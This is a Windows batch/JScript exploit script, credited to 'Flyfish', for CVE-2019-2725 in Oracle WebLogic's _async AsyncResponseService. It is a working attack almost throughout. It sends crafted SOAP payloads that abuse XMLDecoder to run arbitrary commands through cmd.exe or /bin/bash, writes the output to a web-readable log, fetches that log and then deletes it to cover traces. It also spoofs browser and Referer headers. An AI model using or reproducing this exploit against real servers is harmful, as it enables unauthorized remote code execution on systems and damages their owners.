@if (@vul) == (@VUL) @end /*****
@echo off
title cve2019-2725_RCE - Weblogic _async remote command execution by Flyfish
cscript //E:JScript //nologo "%~f0" "%~nx0" %* 
exit /b %errorlevel%
CVE-2019-2725 weblogic_rce command execution output version 
Author:Flyfish
https://github.com/FlyfishSec/weblogic_rce *****/

whr = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
args = WScript.Arguments;
exp_str = Math.random();
payload_xml_pre = "<soapenv:Envelope xmlns:soapenv=\"http:\/\/schemas.xmlsoap.org\/soap\/envelope\/\" xmlns:wsa=\"http:\/\/www.w3.org\/2005\/08\/addressing\" xmlns:asy=\"http:\/\/www.bea.com\/async\/AsyncResponseService\">  \r\n  <soapenv:Header> \r\n    <wsa:Action>log<\/wsa:Action>\r\n    <wsa:RelatesTo>log<\/wsa:RelatesTo>\r\n    <work:WorkContext xmlns:work=\"http:\/\/bea.com\/2004\/06\/soap\/workarea\/\">";
payload_xml_suff = "    <\/work:WorkContext>\r\n  <\/soapenv:Header>\r\n  <soapenv:Body>\r\n    <asy:onAsyncDelivery\/>\r\n  <\/soapenv:Body>\r\n<\/soapenv:Envelope>";
payload_xml_win_pre = "<java class=\"java.beans.XMLDecoder\"> \r\n        <object class=\"java.lang.Runtime\" method=\"getRuntime\"> \r\n          <void method=\"exec\"> \r\n            <array class=\"java.lang.String\" length=\"3\"> \r\n              <void index=\"0\"> \r\n                <string>c:\\windows\\system32\\cmd.exe<\/string> \r\n              <\/void>  \r\n              <void index=\"1\"> \r\n                <string>\/c<\/string> \r\n              <\/void>  \r\n              <void index=\"2\"> \r\n                <string>";
payload_xml_linux_pre = "<java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"> \r\n        <void class=\"java.lang.ProcessBuilder\"> \r\n          <array class=\"java.lang.String\" length=\"3\"> \r\n            <void index=\"0\"> \r\n              <string>\/bin\/bash<\/string> \r\n            <\/void>  \r\n            <void index=\"1\"> \r\n              <string>-c<\/string> \r\n            <\/void>  \r\n            <void index=\"2\"> \r\n              <string>";
payload_xml_win_suff = "<\/string> \r\n              <\/void> \r\n            <\/array> \r\n          <\/void> \r\n        <\/object> \r\n      <\/java>";
payload_xml_linux_suff = "<\/string> \r\n            <\/void> \r\n          <\/array>  \r\n          <void method=\"start\"\/>\r\n        <\/void> \r\n      <\/java>";
command_output_linux = " > .\/servers\/AdminServer\/tmp\/_WL_internal\/bea_wls9_async_response\/8tpkys\/war\/access.log";
command_output_win = " > .\/servers\/AdminServer\/tmp\/_WL_internal\/bea_wls9_async_response\/8tpkys\/war\/access" + exp_str + ".log";
command_linux_clean = "rm -f .\/servers\/AdminServer\/tmp\/_WL_internal\/bea_wls9_async_response\/8tpkys\/war\/access.log";
command_win_clean = "del \/q .\\servers\\AdminServer\\tmp\\_WL_internal\\bea_wls9_async_response\\8tpkys\\war\\access*.log";

if (args.Length == 3 ) {
    url = args.Item(1) + "/_async/AsyncResponseService";
    command_output_linux = args.Item(2) + command_output_linux
    payload = payload_xml_pre + payload_xml_linux_pre + command_output_linux + payload_xml_linux_suff + payload_xml_suff;
    request(url);
    WScript.Sleep(202);
        if (whr.status == "202"){
        url = args.Item(1) + "/_async/access.log"
        payload = "";
        request(url)
        //WScript.Echo(whr.status);
        //WScript.Echo(whr.statustext);
        if (whr.status == "200") {
            WScript.Echo();
            WScript.Echo(whr.responseText);
            url = args.Item(1) + "/_async/AsyncResponseService";
            payload = payload_xml_pre + payload_xml_linux_pre + command_linux_clean + payload_xml_linux_suff + payload_xml_suff;
            request(url);
        } else if (whr.status != "200") {
            url = args.Item(1) + "/_async/AsyncResponseService";
            command_output_win = args.Item(2) + command_output_win;
            payload = payload_xml_pre + payload_xml_win_pre + command_output_win + payload_xml_win_suff + payload_xml_suff;
            request(url);
            WScript.Sleep(202);
	if (whr.status == "202") {
                    url = args.Item(1) + "/_async/access" + exp_str + ".log";
                    payload = "";
                    request(url);
                    if (whr.status == "200") {
                        WScript.Echo(whr.responseText);
                        //WScript.Echo(url);
                        url = args.Item(1) + "/_async/AsyncResponseService";
	                payload = payload_xml_pre + payload_xml_win_pre + command_win_clean + payload_xml_win_suff + payload_xml_suff;
                        request(url);
                } else {
                    WScript.Echo("-The Command execution failed");
                }
            } else {
                WScript.Echo("-The vulnerability does not exist");
            }
        } else {
            WScript.Echo("-The Command execution failed");
        }
    } else {
        WScript.Echo("-The vulnerability does not exist");     
    }
    WScript.Quit(666);
} else {
    WScript.Echo("-Wrong arguments!");
}
function request(url) {
    var RESOLVE_TIMEOUT = 10000;
    var CONNECT_TIMEOUT = 15000;
    var SEND_TIMEOUT = 10000;
    var RECEIVE_TIMEOUT = 15000;
    whr.open('POST', url, false);
    whr.Option(4) = 13056;  
    whr.Option(6) = false; 
    whr.SetRequestHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3");
    whr.setRequestHeader("Accept", "*/*")
    whr.setRequestHeader("Content-Type","text/xml")
    whr.SetRequestHeader("Referer", "http://www.baidu.com/")
    whr.SetRequestHeader("Cache-Control","no-cache");
    whr.SetRequestHeader("Connection", "Close")
    whr.send(payload);
}
